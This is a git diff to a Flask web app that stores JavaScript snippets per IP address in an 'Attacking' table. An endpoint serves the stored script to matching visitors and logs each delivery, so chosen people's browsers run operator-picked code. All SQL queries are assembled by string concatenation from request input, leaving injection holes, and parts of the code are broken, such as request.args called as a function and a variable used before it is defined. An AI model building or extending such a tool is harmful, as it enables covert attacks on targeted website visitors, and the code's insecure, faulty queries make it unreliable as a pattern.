@@ -15,6 +15,7 @@ import json
 import urllib.request
 from ua_parser import user_agent_parser
 from flask import send_from_directory
+import time
 
 import string
 import random
@@ -223,10 +224,10 @@ def storeInAttackingTable(content):
     for i in content:
         print(i, ": ", content[i], " ", type(content[i]))
         col += i + ", "
-        #if isinstance(content[i], str):
-        #    strs[i] = 1
-        #    s += i + " TEXT, "
-        if isinstance(content[i], int):
+        if isinstance(content[i], str):
+            strs[i] = 1
+            s += i + " TEXT, "
+        elif isinstance(content[i], int):
             ints[i] = 1
             s += i + " INTEGER, "
         elif isinstance(content[i], float):
@@ -253,25 +254,56 @@ def storeInAttackingTable(content):
     print(col)
     cur.execute(s)
     #insert
-    s = "INSERT INTO Attacking (" + col + ") VALUES ("
-    
-    for i in content:
-        if i in strs:
-            s += "'" + content[i] + "', "
-        elif i in others:
-            
-            s += "'" + content[i] + "', "
-        else:
-            s += str(content[i]) + ", "
-    colList = list(s)
-    colList[-1] = ';'
-    colList[-2] = ')'
-    s = ''.join(colList)
-    #print(s)
+    l = getfromdb('Attacking', ['ip'], [content['ip']])
+    if len(l) == 0: 
+        s = "INSERT INTO Attacking (" + col + ") VALUES ("
+        
+        for i in content:
+            if i in strs:
+                s += "'" + content[i] + "', "
+            elif i in others:
+                
+                s += "'" + content[i] + "', "
+            else:
+                s += str(content[i]) + ", "
+        colList = list(s)
+        colList[-1] = ';'
+        colList[-2] = ')'
+        s = ''.join(colList)
+        #print(s)
+        print(s)
+        cur.execute(s)
+        conn.commit()
+        conn.close()
+    else:
+        s = "UPDATE Attacking SET "
+        for i in content:
+            if i == 'ip':
+                print("Dont Change")
+            elif i in strs:
+                s += i + " = '" + content[i] + "', "
+            elif i in others:
+                s += i + " = '" + content[i] + "', "
+            else:
+                s += i + " = " + str(content[i]) + ", "
+        colList = list(s)
+        colList = colList[:-2]
+        s = ''.join(colList)
+        s += " where ip = '" + content['ip'] + "';"
+        #print(s)
+        cur.execute(s)
+        conn.commit()
+        conn.close()
+
+def getJSWithThisIP(ip):
+    conn = sqlite3.connect('db.sqlite3')
+    cur = conn.cursor()
+    s = "SELECT js from Attacking where ip = '" + str(ip) + "';"
     print(s)
     cur.execute(s)
-    conn.commit()
-    conn.close()
+    rows = cur.fetchall()
+    print(rows[0][0])
+    return str(rows[0][0])
 
 @blueprint.route('/index')
 @login_required
@@ -514,8 +546,18 @@ def checkip_attack():
     ip = request.environ['REMOTE_ADDR'] 
     #db check 
     # status = checkindb_if_to_attack_or_not if yes get js for it
-    js_to_supply = "alert('attacked');"
-    return js_to_supply
+    js_to_supply = 'alert("attacked");'
+    l = getfromdb('Attacking', ['ip'], [str(ip)])
+    if len(l) == 0:
+        return 'console.log("Not tracked");'
+    else:
+        js = getJSWithThisIP(ip)
+        content = {}
+        content['ip'] = ip
+        content['js'] = js
+        content['timestamp'] = str(time.time())
+        storeInTrackingTable(content)
+        return js
 
 @login_required
 @blueprint.route('/attack',methods=['GET','POST'])
@@ -526,23 +568,23 @@ def attack():
             IP = request.args('ipaddr')
             JS = request.args('jsoffsec')
             content = {}
-            content[IP] = JS
+            content['ip'] = IP
+            content['js'] = JS
             storeInAttackingTable(content)
             return redirect("/attack", code=302)
-
         if request.args('mode') == "search":
             IP = request.args('ipaddr')
             # search for js respective to partivular ip
-            getfromdb("Attacking",[IP,"JS"],[content["IP"],content["JS"]])
+            getfromdb("Attacking",['ip',"js"],[content["ip"],content["js"]])
             return render_template('home/attack.html', segment='index', search = content)
 
     else:
-        content1 = {}
-        content1["ip"] = "58.56.25.25"
-        content1["program"] = "alert('works')"
-        # store a ip and js pair together , make it unique and overwrite
-        storeInAttackingTable(content1)
         content = {}
-        getfromdb("Attacking",["IP","JS"],[content["IP"],content["JS"]])
+        content['ip'] = '127.0.0.1'
+        content['js'] = '()=>{console.log("Something");--#!@#$%^&*[]................'
+        content['timestamp'] = ''
+        # store a ip and js pair together , make it unique and overwrite
+        storeInAttackingTable(content)
+        #getfromdb("Attacking", ["ip","js"],[content["ip"],content["js"]])
         
         return render_template('home/attack.html', segment='index', alldetails = content)
